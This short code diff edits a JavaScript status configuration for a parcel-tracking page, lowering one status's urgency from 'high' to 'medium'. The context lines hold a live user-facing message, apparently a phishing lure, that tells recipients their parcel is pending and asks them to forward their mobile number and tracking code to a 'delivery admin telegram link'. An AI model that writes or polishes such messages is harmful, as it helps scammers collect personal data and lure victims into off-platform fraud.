@@ -73,7 +73,7 @@ const STATUS_CONFIG = {
     title: "Package Status: Pending - Action Needed",
     message:
       "Your Parcel is currently pending and requires attention. Please forward your mobile number and tracking code to the delivery admin telegram link below to complete and confirm your shipping registration.",
-    urgency: "high",
+    urgency: "medium",
     showActions: true,
     actions: {
       showTrackingButton: false,
